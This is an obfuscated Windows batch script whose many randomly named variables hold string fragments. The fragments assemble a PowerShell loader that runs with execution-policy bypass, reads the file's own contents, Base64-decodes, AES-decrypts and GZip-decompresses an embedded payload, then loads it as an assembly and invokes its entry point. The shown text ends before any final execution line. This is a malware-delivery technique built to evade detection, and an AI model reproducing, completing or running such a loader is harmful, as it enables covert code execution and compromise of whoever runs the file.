@echo off
set "TyhYtmavYh=he"
set "XvkUpjoYpv=32"
set "sPPCAyhZAI=ll"
set "TeZBZIJHzY=\W"
set "NHpzhXAaQK=xe"
set "txpEiOksKK=1."
set "odsSCiuyOJ=ws"
set "mHtPChFiiy=s\"
set "qqhgOKvvDi=po"
set "wVvvSWMoVd=ll"
set "TPegGHQzXu=co"
set "fqwlojXckf=py"
set "LuEkEQWOfd=rs"
set "RmuOPZAyIb=Po"
set "yymoGrkOAN=0\"
set "HWKYMsoYJd=Sy"
set "IxaPLVFcKg= /"
set "gZWcOicJFr=ow"
set "LuBwcVMXBY=.e"
set "sEXMpDbHnw=st"
set "fplMOJBQCV= C"
set "ojcMvlcaeM=\v"
set "DYJcEpcEfD=Wi"
set "nGktKcFcjd=rS"
set "jnIpdDEssW=nd"
set "IXoxsGLdoA=y "
set "nsqdWzTlvc=we"
set "gYULlnWWHl=in"
set "kaqmNYGQne=we"
set "GWnMGWXqIv=:\"
set "anAqwcpjQy=he"
set "mtZOrBTTNV=em"
set "yukOgWudxf=do"
set "vTvIxlHLKa=cd"
set "bglNbUtdpl= %~dp0"
set "rWVXeqiqDy=e]::"
set "BnwGvaBIVu=;$is"
set "dBZVeWaJXy=bstr"
set "HihZaqSsXz=wu.I"
set "XhqXjuwPTY=ke($"
set "TxhWimARqh=ss -"
set "nkzUIOkIdc=7;$D"
set "GqVhpHNDbB=.IO."
set "oZeQLlyVum=File"
set "sPaARdXyEg=.GZi"
set "RxaZlsqwOg=OyzA"
set "wrckfztVqX=form"
set "NyvtKHmfxt=.Dis"
set "muywMBFxQV=sion"
set "EHiBUxTFgU=P) {"
set "kWUNYKxhfj=-Obj"
set "ckIKdXTHgo=nage"
set "FFhfmqhfls=Obje"
set "yeluIuiSBY=yTo("
set "aGTUXLaKNX=ress"
set "xUcXShqLpn=3HWs"
set "SnrDGhREwp=bypa"
set "sPfsZrJBko=urit"
set "SPpYcSZaJT=..-1"
set "WkVabhSscv=rity"
set "iqXNqgJDGK=N.En"
set "PLaDzVfLsa=$WQJ"
set "teAteUsSqS=XIwu"
set "qOAIUlqlUZ=null"
set "VDHROuqigO=ct S"
set "oXEEHddagv=embl"
set "ecJXakLNpV=; };"
set "GeslAJSkqR=se()"
set "waKtfJTyVu=16] "
set "iadDCuCZTp=('%~f0'"
set "vrAoWNkwHz=tion"
set "EoqnCBLxQP=tsWi"
set "LDBTkdLebC='gni"
set "UsUCGxETWT=saBm"
set "EwtLqoLVyS=m.Re"
set "gsJvHBwpUK=JVz."
set "tknsFkfWjR=Fo7l"
set "SXYZJItDMT=$DXI"
set "OqXEUaiRmu=Fina"
set "ueTYFouXat=;$Gy"
set "APFzKBbSGc=yste"
set "evlHxnLmdC=lvro"
set "okpIOaCvtt=ddin"
set "pADMniomBw=$lvr"
set "FdafIHPYFP=ct S"
set "KsYFQhbNHp=[IO."
set "evyTVjDwzA=);$h"
set "hsJNDBtSDf= [st"
set "FUUOnSZMTK=v4Ir"
set "ITCTfMvTpM=rLa."
set "lPTaWBhkNL=gnir"
set "hRdjyjIDTi=ewLi"
set "VbtGUhgUXp=)($Z"
set "IMOCBQhDCS=yste"
set "EXJwHEjWDP=DXIw"
set "FxiHxlkqkC=tryP"
set "qRRwsPGmgz=ddin"
set "gfMXtlthym=QuN "
set "cckJFsdCwL=]::("
set "GRCvmyZiRI='dqR"
set "suFQufPwKt=.Mod"
set "gAtXUKPxoD=Mode"
set "FYbOSyoeEf=le  "
set "IGrQjlVQEt== $D"
set "GvVcqyOZri=::De"
set "FOXyuOudyF=ring"
set "IVZfTupmHR=ispo"
set "wXObIDpyyw=-joi"
set "xfjNisvRBB=lit("
set "juCDxmjiWh= '')"
set "XkCJnJQCym=XIwu"
set "tfYJalZnAa=z = "
set "XtqoqUzbpC=[Sys"
set "epoYucHfmf=('da"
set "ckigTDBBVv= = N"
set "lCGjGNiOPH=-nop"
set "UwmgBFNpcl=Conv"
set "xDRldZbIQC=XIwu"
set "wcWKLfNlIQ=($VZ"
set "SfGhsZMMMe=New-"
set "jQhEdjZZgi=;$is"
set "hkzfdVpOpo=Vz, "
set "iIQtDocBhd=lvro"
set "ZmTRXCOtaw=comp"
set "moKfIQFPAs=);$D"
set "AfYHJsrsmt=e = "
set "peUeOaZrcS=stem"
set "vZXpXhbFAx=:: '"
set "bzgZZGIsYv=morF"
set "KgINuFbPRC=[]] "
set "TGJgcrTAcH=ck($"
set "vnwmYrkhVG=($VZ"
set "ycMjIeggUz=.Ass"
set "YQOamdspEV=.Cre"
set "PLFgwrugbk=1..-"
set "jRJXzzeVNM=]::C"
set "yiWhzAeRZM=New-"
set "ryqeyhbLyB=rity"
set "VNpfRXeMes=('%*'"
set "iJPRWLNwoq=)($l"
set "zMxUWNlWVN=GyQu"
set "glKEZmhmpV=g = "
set "ZHxivMhXfW=qTvi"
set "xMUBkXhcZJ=pd.T"
set "xsVqpUNruo=yste"
set "vBtVWnSSIg=ert]"
set "YnjIWxmRkR=V = "
set "dYsnIzaBrA=ptog"
set "uHpexxrbfq=lBlo"
set "ipEwJHcZez=6] -"
set "oEFzepANqF=vj0m"
set "HqfKhyRnyk=pStr"
set "DpbrkoSJkI=Star"
set "TysgfjqJXl=+hAO"
set "pVMuzRZcsj=gth)"
set "HKHpmZJQzk=$QyB"
set "wxLwLFOxuw=m(, "
set "ZSICwJoyTA=ypto"
set "DYuopoKMKE=.-16"
set "lHApxRvBzU=ne);"
set "gIPFlEERNH=vroz"
set "UKNHywBsOZ=QyBA"
set "eaTmbdRpuj=ment"
set "jUOSqZcSwB=ode]"
set "VTZtXgaKkD=z = "
set "bnTeKKTlEy=isfL"
set "EPHuIxWxmc=VZrL"
set "gUdPGasGwj=rofi"
set "OlsTsSIZwt=[Sys"
set "JtzhZJvfiZ=..-1"
set "CUMsRarCMd=Invo"
